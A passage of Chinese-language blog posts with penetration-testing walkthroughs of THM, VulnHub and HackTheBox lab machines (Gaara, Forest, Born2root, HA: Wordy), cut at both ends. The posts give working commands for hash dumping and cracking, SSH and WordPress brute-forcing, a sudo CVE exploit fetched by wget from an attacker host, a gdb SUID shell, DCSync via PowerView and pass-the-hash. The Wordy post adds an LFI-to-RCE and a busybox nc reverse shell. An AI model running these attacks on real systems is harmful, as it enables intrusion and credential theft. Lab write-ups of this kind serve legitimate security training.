<p>由于笔者 mimitaskz 上传后并不能成功执行，故尝试通过注册表导出 SAM 和 SYSTEM 文件，保存在 C:&#x2F;xampp&#x2F;htdocs&#x2F;oscommerce-2.3.4&#x2F;docs&#x2F; 目录中，这样就可以直接访问 web 站点进行下载</p>
<p><img src="/picture/image-20250419194629218.png" alt="image-20250419194629218"></p>
<p>访问 &#x2F;oscommerce-2.3.4&#x2F;docs&#x2F; 目录，点击直接下载 SAM 和 SYSTEM 文件</p>
<p><img src="/picture/image-20250419194831069.png" alt="image-20250419194831069"></p>
<p>使用 samdump2 提取 NTLM 哈希</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">samdump2 system.save sam.save </span><br></pre></td></tr></table></figure>

<p>获得 Lab NTLM 哈希</p>
<p><img src="/picture/image-20250419195535055.png" alt="image-20250419195535055"></p>
<p>在 <a href="https://crackstation.net/">https://crackstation.net/</a> 破解出 Lab 的明文密码</p>
<p><img src="/picture/image-20250419200306130.png" alt="image-20250419200306130"></p>
<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250419200342460.png" alt="image-20250419200342460"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>THM</tag>
      </tags>
  </entry>
  <entry>
    <title>Gaara Walkthrough</title>
    <url>/2025/03/26/Gaara/</url>
    <content><![CDATA[<h1 id="Gaara-Walkthrough"><a href="#Gaara-Walkthrough" class="headerlink" title="Gaara Walkthrough"></a>Gaara Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/gaara-1,629/">Gaara: 1</a></p>
<p><img src="/picture/image-20250326123110685.png" alt="image-20250326123110685"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机做端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.69</span><br></pre></td></tr></table></figure>

<p>目标主机开放 22、80 端口</p>
<p><img src="/picture/image-20250326110434275.png" alt="image-20250326110434275"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A -T4 172.16.33.69 </span><br></pre></td></tr></table></figure>

<p>22 端口开放 SSH 服务，80 端口开放 http 服务</p>
<p><img src="/picture/image-20250326110603058.png" alt="image-20250326110603058"></p>
<p>先来看 SSH 服务，尝试弱口令远程登陆，同时看看能不能泄露机密信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.69</span><br></pre></td></tr></table></figure>

<p>可惜失败了</p>
<p><img src="/picture/image-20250326110715391.png" alt="image-20250326110715391"></p>
<p>那么暂时就拿 22 端口没办法了，再来看看 80 端口，进行目录发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.69</span><br></pre></td></tr></table></figure>

<p>呃，一个都没扫描的？</p>
<p><img src="/picture/image-20250326111411455.png" alt="image-20250326111411455"></p>
<p>直接访问目标站点看看？</p>
<p>仅为一张图片</p>
<p><img src="/picture/image-20250326111749132.png" alt="image-20250326111749132"></p>
<p>但是图片右下角泄露了邮箱，后半段甚至可以是域名</p>
<p><img src="/picture/image-20250326111812291.png" alt="image-20250326111812291"></p>
<p>将目标主机 IP 和域名绑定，再次访问试试看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250326111939206.png" alt="image-20250326111939206"></p>
<p>可惜的是还是不行，看来还有隐藏目录我们没发现，尝试结合字典对目标站点进行目录发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirb/big.txt</span><br><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirb/common.txt </span><br><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span><br></pre></td></tr></table></figure>

<p>幸运的是，找到了 &#x2F;Cryoserver 目录</p>
<p><img src="/picture/image-20250326111308782.png" alt="image-20250326111308782"></p>
<p>眼看起来啥也没有，但是我在右边看到了滚动进度条，在进度条最底下看到了额外的三个目录</p>
<p><img src="/picture/image-20250326112630153.png" alt="image-20250326112630153"></p>
<p>在 &#x2F;iamgara 里面找到了可疑字符串</p>
<p><img src="/picture/image-20250326113032549.png" alt="image-20250326113032549"></p>
<p>CyberChef 没跑出来？有点怪啊</p>
<p><img src="/picture/image-20250326114624494.png" alt="image-20250326114624494"></p>
<p>既然网站都是关于 Gaara 的描述，那看看能不能用该用户名爆破 SSH 密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -l gaara -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.69</span><br></pre></td></tr></table></figure>

<p>幸运的是，密码被爆破出来了</p>
<p><img src="/picture/image-20250326115056046.png" alt="image-20250326115056046"></p>
<p>直接 SSH 远程登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh gaara@172.16.33.69</span><br></pre></td></tr></table></figure>

<p>成功突破边界</p>
<p><img src="/picture/image-20250326115157844.png" alt="image-20250326115157844"></p>
<p>获得 flag.txt</p>
<p><img src="/picture/image-20250326115555231.png" alt="image-20250326115555231"></p>
<p>同时发现可疑文件 Kazekage.txt ，内容似乎是 base64 编码，解密出来是一个目录</p>
<p><img src="/picture/image-20250326115855797.png" alt="image-20250326115855797"></p>
<p>在目录内发现抽象密文</p>
<p><img src="/picture/image-20250326120609244.png" alt="image-20250326120609244"></p>
<p>可通过在线工具 <a href="https://copy.sh/brainfuck/">El Brainfuck</a> 进行解密，看起来是烟雾弹</p>
<p><img src="/picture/image-20250326120716583.png" alt="image-20250326120716583"></p>
<p>看看 sudo 版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gaara@Gaara:~$ sudo -V</span><br><span class="line">Sudo version 1.8.27</span><br><span class="line">sudo: unable to resolve host Gaara: Temporary failure <span class="keyword">in</span> name resolution</span><br><span class="line">Sudoers policy plugin version 1.8.27</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.27</span><br></pre></td></tr></table></figure>

<p>看起来可以使用 CVE-2021-3156 提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/exploit_nss.py -O exp.py</span><br><span class="line">chmod +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure>

<p>成功获得 root 权限</p>
<p><img src="/picture/image-20250326121834252.png" alt="image-20250326121834252"></p>
<p>获得 root.txt</p>
<p><img src="/picture/image-20250326121912200.png" alt="image-20250326121912200"></p>
<p>当然，在查找哪些文件具有 SUID 权限时，发现了 gdb 文件</p>
<p><img src="/picture/image-20250326122634005.png" alt="image-20250326122634005"></p>
<p>直接切换至 &#x2F;usr&#x2F;bin 目录，执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br></pre></td></tr></table></figure>

<p>可直接提权成功</p>
<p><img src="/picture/image-20250326122802782.png" alt="image-20250326122802782"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Forest Walkthrough</title>
    <url>/2025/04/22/Forest/</url>
    <content><![CDATA[<h1 id="Forest-Walkthrough"><a href="#Forest-Walkthrough" class="headerlink" title="Forest Walkthrough"></a>Forest Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://app.hackthebox.com/machines/212">Forest</a></p>
<p>Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.</p>
<p><img src="/picture/image-20250422165110274.png" alt="image-20250422165110274"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>nmap 对目标主机就行端口发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.129.237.62 --min-rate 5000</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250422102041328.png" alt="image-20250422102041328"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -sV -sC 10.129.237.62</span><br></pre></td></tr></table></figure>

<p>发现该机器是 htb.local 的域控制器，同时发现 3268 开放 LDAP 服务</p>
<p><img src="/picture/image-20250422102514778.png" alt="image-20250422102514778"></p>
<p>使用 impacket 中的 GetNPUsers 脚本检查哪些用户名禁用了 Kerberos 预身份验证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers -dc-ip 10.129.237.62 -request <span class="string">&#x27;htb.local/&#x27;</span> -outputfile hash.asreproasting 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>获得 svc-alfresco 的密码哈希</p>
<p><img src="/picture/image-20250422120902844.png" alt="image-20250422120902844"></p>
<p>使用 hashcat 破解 18200 的 AS-REP 模式破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 hash.asreproasting -a 0 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>密码为 s3rvice</p>
<p><img src="/picture/image-20250422121003025.png" alt="image-20250422121003025"></p>
<p>由于目标主机开放 WinRM 服务，借此进行横向移动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -u svc-alfresco -p s3rvice -i 10.129.237.62</span><br></pre></td></tr></table></figure>

<p>成功登陆域账号 htb\svc-alfresco </p>
<p><img src="/picture/image-20250422121304176.png" alt="image-20250422121304176"></p>
<p>在桌面获得 user.txt</p>
<p><img src="/picture/image-20250422165234623.png" alt="image-20250422165234623"></p>
<p>上传并执行 SharpHound ，获得 20250421214111_BloodHound.zip 文件</p>
<p><img src="/picture/image-20250422123533276.png" alt="image-20250422123533276"></p>
<p>kali 本机 forest 目录开启 SMB 共享，并命名为 home ，账户和密码为 kali&#x2F;kali</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-smbserver -username kali -password kali -smb2support home .</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250422124312506.png" alt="image-20250422124312506"></p>
<p>目标主机远程登陆 kali SMB 共享，使用 cp 命令将 20250421214111_BloodHound.zip 拷贝至 kali 本机 forest 目录下</p>
<p><img src="/picture/image-20250422124201022.png" alt="image-20250422124201022"></p>
<p>文件传输成功</p>
<p><img src="/picture/image-20250422124538035.png" alt="image-20250422124538035"></p>
<p>启动 neo4j ，启动 bloodhound</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo neo4j start</span><br><span class="line">bloodhound</span><br></pre></td></tr></table></figure>

<p>将 zip 文件上传并分析，发现 <a href="mailto:&#x53;&#x56;&#67;&#x2d;&#65;&#x4c;&#70;&#82;&#69;&#x53;&#67;&#79;&#x40;&#72;&#x54;&#66;&#46;&#76;&#79;&#67;&#65;&#x4c;">&#x53;&#x56;&#67;&#x2d;&#65;&#x4c;&#70;&#82;&#69;&#x53;&#67;&#79;&#x40;&#72;&#x54;&#66;&#46;&#76;&#79;&#67;&#65;&#x4c;</a> 属于 ACCOUNT OPERATORS 特权组，该组成员可以管理域用户和组帐户</p>
<p>且可以完全控制 EXCHANGE WINDOWS PERMISSIONS ，那就就能够继承用户组的 WriteDACL 权限，WriteDACL 权限可以修改域对象的 ACL，最终实现利用 DCSync 导出域内所有用户 hash</p>
<p><img src="/picture/image-20250422163716954.png" alt="image-20250422163716954"></p>
<p>使用 ACCOUNT OPERATORS 特权生成并将用户加入 Exchange Windows Permissions 组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user Ed3n PassWord /add /domain</span><br><span class="line">net group &quot;Exchange Windows Permissions&quot; /add Ed3n</span><br></pre></td></tr></table></figure>

<p>下载并执行 PowerView 脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.13/PowerView.ps1&#x27;)</span><br></pre></td></tr></table></figure>

<p>要结合 Add-DomainObjectAcl 执行此操作，首先创建一个 PSCredential 对象 ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pass = ConvertTo-SecureString &#x27;PassWord&#x27; -AsPlainText -Force</span><br><span class="line">$cred = New-Object System.Management.Automation.PSCredential(&#x27;HTB\Ed3n&#x27;, $pass)</span><br></pre></td></tr></table></figure>

<p>然后，使用 Add-DomainObjectAcl 函数，授予 DCSync 权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Add-DomainObjectAcl -Credential $cred -TargetIdentity &quot;DC=htb,DC=local&quot; -PrincipalIdentity Ed3n -Rights DCSync</span><br></pre></td></tr></table></figure>

<blockquote>
<p>-TargetIdentity : 目标域</p>
<p>-PrincipalIdentity : 被授予权限的用户</p>
<p>-Rights DCSync : 允许执行 DCSync 操作</p>
</blockquote>
<p>使用 impacket 工具的 secretsdump 模块，通过 DCSync 攻击导出域内所有用户的密码哈希</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump htb.local/Ed3n:PassWord@10.129.237.62</span><br></pre></td></tr></table></figure>

<p>获得 htb.local 的 administrator NTLMHASH密码</p>
<p><img src="/picture/image-20250422150958588.png" alt="image-20250422150958588"></p>
<p>使用 nxc 检测得到的 NTLMHASH 是否正确</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.237.62 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -M lsassy</span><br></pre></td></tr></table></figure>

<p>看到 Pwn3d 就放心了</p>
<p><img src="/picture/image-20250422154349040.png" alt="image-20250422154349040"></p>
<p>使用 impacket-psexec 进行 PTH 攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.237.62</span><br></pre></td></tr></table></figure>

<p>成功登陆域控</p>
<p><img src="/picture/image-20250422152418226.png" alt="image-20250422152418226"></p>
<p>获得 root.txt</p>
<p><img src="/picture/image-20250422152908405.png" alt="image-20250422152908405"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>HTB</tag>
        <tag>AD</tag>
      </tags>
  </entry>
  <entry>
    <title>Born2root Walkthrough</title>
    <url>/2025/03/23/Born2root/</url>
    <content><![CDATA[<h1 id="Born2root-Walkthrough"><a href="#Born2root-Walkthrough" class="headerlink" title="Born2root Walkthrough"></a>Born2root Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：[Born2Root: 1](<a href="https://www.vulnhub.com/entry/born2root-1,197/">Born2Root: 1 ~ VulnHub</a>)</p>
<p><img src="/picture/image-20250323173030438.png" alt="image-20250323173030438"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.98  </span><br></pre></td></tr></table></figure>

<p>发现 22，80，111，38734 端口</p>
<p><img src="/picture/image-20250323103653485.png" alt="image-20250323103653485"></p>
<p>在进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 22,80,111,38734 -A -T4 172.16.33.98</span><br></pre></td></tr></table></figure>

<p>也是发现了 80 端口的 robots.txt ，同时发现高位端口的服务还是不明</p>
<p><img src="/picture/image-20250323103810069.png" alt="image-20250323103810069"></p>
<p>先来看看 22 端口，直接使用 ssh 客户端连接，尝试弱口令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.98  </span><br></pre></td></tr></table></figure>

<p>可惜的是连接上了 ssh ，并未泄露什么信息，同时弱口令也行不通</p>
<p><img src="/picture/image-20250323104428522.png" alt="image-20250323104428522"></p>
<p>再来看看 80 端口，先前 nmap 扫到了 robots.txt ，直接访问是两个网站 </p>
<p>&#x2F;wordpress-blog 纯是干扰信息，逗你玩的</p>
<p><img src="/picture/image-20250323104615308.png" alt="image-20250323104615308"></p>
<p>&#x2F;files 也是空的</p>
<p><img src="/picture/image-20250323104659011.png" alt="image-20250323104659011"></p>
<p>那么扫描目录看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.98/</span><br></pre></td></tr></table></figure>

<p>换了好些字典，也只扫出来了 &#x2F;files ，&#x2F;icons，&#x2F;manual 和 robots.txt </p>
<p>在 &#x2F;icons 下发现了 VDSoyuAXiO.txt 可疑文件，访问发现是 RSA PRIVATE KEY，但是并不知道这个 key 的用户名是谁</p>
<p><img src="/picture/image-20250323105621435.png" alt="image-20250323105621435"></p>
<p>而 &#x2F;manual 是 Apache HTTP 服务器 2.4 的文档，没有提供用户名信息，那我们直接访问 ip 试试看</p>
<p>发现了三个用户名：martin，hadi，jimmy 和邮箱地址 <code>martin@secretsec.com</code>  </p>
<p><img src="/picture/image-20250323110327281.png" alt="image-20250323110327281"></p>
<p>将各用户名配合泄露的密钥尝试 ssh 登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i private.key martin@172.16.33.98</span><br><span class="line">ssh -i private.key hadi@172.16.33.98</span><br><span class="line">ssh -i private.key jimmy@172.16.33.98</span><br></pre></td></tr></table></figure>

<p>可惜都失败了，80 端口似乎没有路子了，再来看看 111 端口，尝试登陆和用户名登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient 172.16.33.98</span><br><span class="line">rpcclient --user jimmy 172.16.33.98</span><br><span class="line">rpcclient --user hadi 172.16.33.98</span><br><span class="line">rpcclient --user martin 172.16.33.98</span><br></pre></td></tr></table></figure>

<p>都报了 Cannot connect to server.  Error was NT_STATUS_CONNECTION_REFUSED 错，意思是目标主机虽然开启了 111 端口 NFS 服务，但不接受登录请求</p>
<p><img src="/picture/image-20250323154952588.png" alt="image-20250323154952588"></p>
<p>既然不让我们登陆，那我们拿他也没什么办法，那只能试试 SSH 密码爆破了，毕竟有三个用户名</p>
<p>将三个用户名保存为用户名字典 user.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure>

<blockquote>
<p>s 参数会将用户名当成密码尝试</p>
<p>r 会使用倒置的用户名当作密码尝试</p>
<p>n 使用空密码</p>
</blockquote>
<p>密码字典也可以使用 cewl 在目标网站进行爬取后生成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl 172.16.33.98 -m 4 -w pass.txt</span><br></pre></td></tr></table></figure>

<p>开始密码爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P pass.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure>

<p>可惜没跑出来</p>
<p><img src="/picture/image-20250323160928271.png" alt="image-20250323160928271"></p>
<p>试试对 pass.txt 进行变形操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat --stdout pass.txt -r /usr/share/hashcat/rules/combinator.rule -o newpass.txt</span><br></pre></td></tr></table></figure>

<p>再使用新的密码跑一遍看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -L user.txt -P newpass.txt ssh://172.16.33.98</span><br></pre></td></tr></table></figure>

<p>密码为 hadi123 </p>
<p><img src="/picture/image-20250323164351354.png" alt="image-20250323164351354"></p>
<p>直接 ssh 登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh hadi@172.16.33.98</span><br></pre></td></tr></table></figure>

<p>登陆成功</p>
<p><img src="/picture/image-20250323162853128.png" alt="image-20250323162853128"></p>
<p>接下来就是提权，比较搞的时，su 的密码也是 hadi123 ，直接就变成 root 了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250323172852355.png" alt="image-20250323172852355"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>HAWordy Walkthrough</title>
    <url>/2025/03/24/HAWordy/</url>
    <content><![CDATA[<h1 id="HA-Wordy-Walkthrough"><a href="#HA-Wordy-Walkthrough" class="headerlink" title="HA: Wordy Walkthrough"></a>HA: Wordy Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/ha-wordy,363/">HA: Wordy</a> </p>
<p><img src="/picture/image-20250322192153885.png" alt="image-20250322192153885"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先进行端口扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p- 172.16.33.108             </span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:21 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>

<p>看来目标主机只开放了 80 端口，进一步做应用版本发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -p 80 -A -T4 172.16.33.108 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 21:22 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.33.108 (172.16.33.108)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></pre></td></tr></table></figure>

<p>80 开放的是 Apache httpd 服务，版本为 2.4.29 ，过高，漏洞较难利用，接下来尝试进行 WEB 目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.108/</span><br></pre></td></tr></table></figure>

<p>发现 wp 目录和登陆界面，猜测是 wp 构建的网站，同时发现 info.php ，但内容仅为目标主机 IP</p>
<p><img src="/picture/image-20250322114239464.png" alt="image-20250322114239464"></p>
<p>访问 &#x2F;wordpress&#x2F;wp-login.php ，尝试输入账户名和密码，发现存在用户名枚举漏洞，存在 admin 账户</p>
<p><img src="/picture/image-20250322114635271.png" alt="image-20250322114635271"></p>
<p><img src="/picture/image-20250322114713974.png" alt="image-20250322114713974"></p>
<p>用户名确定，可以试试密码爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -t 4 172.16.33.108 http-post-form &#x27;/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F172.16.33.108%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:F=is incorrect&#x27;</span><br></pre></td></tr></table></figure>

<p>发送的参数可以在开发者工具中的 NetWork 中找到</p>
<p><img src="/picture/image-20250322114916400.png" alt="image-20250322114916400"></p>
<p>可惜，rockyou 没跑出来，说明密码十分复杂</p>
<p><img src="/picture/image-20250322115026326.png" alt="image-20250322115026326"></p>
<p>既然是 wp 构建的，使用 wpscan 扫扫看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.33.108/wordpress --enumerate u,ap,at --disable-tls-checks</span><br></pre></td></tr></table></figure>

<p>发现了一些目录：</p>
<p><img src="/picture/image-20250322132718031.png" alt="image-20250322132718031"></p>
<p>访问 readme ，只是一个下载引导页面</p>
<p><img src="/picture/image-20250322132911433.png" alt="image-20250322132911433"></p>
<p>再来看主题，为 twentysixteen Version: 2.0，提示似乎有点过时了</p>
<p><img src="/picture/image-20250322133149081.png" alt="image-20250322133149081"></p>
<p>去网上搜搜看对应版本是否有漏洞，可惜没有搜索到</p>
<p>再来看插件，分别是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail-masta version 1.0</span><br><span class="line">reflex-gallery Version: 3.1.3</span><br><span class="line">site-editor Version: 1.1.1</span><br><span class="line">slideshow-gallery Version: 1.4.6</span><br><span class="line">wp-easycart-data (?)</span><br><span class="line">wp-support-plus-responsive-ticket-system Version: 7.1.3</span><br><span class="line">wp-symposium Version: 15.1</span><br></pre></td></tr></table></figure>

<p>我们一个一个来，先是 mail-masta ，幸运的是，在 <a href="https://www.exploit-db.com/exploits/40290">WordPress Plugin Mail Masta 1.0 - Local File Inclusion</a> 页面能找到对应版本漏洞利用代码，而且通过 wpscan 的扫描我们得知，该 wp 服务的文件上传路径是默认的 &#x2F;wp-content 目录，那么就可以直接利用代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="/picture/image-20250322140134547.png" alt="image-20250322140134547"></p>
<p>看看能不能包含 apache 服务日志：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure>

<p>可以包含，那么就尝试 apache 日志包含，可惜失败了，尝试通过伪协议执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>

<p>成功执行</p>
<p><img src="/picture/image-20250322143747568.png" alt="image-20250322143747568"></p>
<p>尝试反弹 shell </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -d &quot;&lt;?php system(&#x27;busybox nc 10.8.0.90 1234 -e /bin/bash&#x27;); ?&gt;&quot; &quot;http://172.16.33.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://input&quot;</span><br></pre></td></tr></table></figure>

<p>同时开启 nc 监听：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>

<p>反弹成功</p>
<p><img src="/picture/image-20250322144039742.png" alt="image-20250322144039742"></p>
<p>在 &#x2F;home&#x2F;raj 目录下找到第一个 flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmlu</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250322172934353.png" alt="image-20250322172934353"></p>
<p>接下来就是提权，在工作目录下的 &#x2F;html 目录中，发现可疑文件，意思是需要 ZIP 来解决</p>
<p><img src="/picture/image-20250322145304048.png" alt="image-20250322145304048"></p>
<p>本机编写接收程序，将 zip 文件上传到宿主机上</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> SimpleHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UploadHandler</span>(<span class="title class_ inherited__">SimpleHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_length = <span class="built_in">int</span>(self.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">        post_data = self.rfile.read(content_length)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;secret.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(post_data)</span><br><span class="line">        self.send_response(<span class="number">200</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 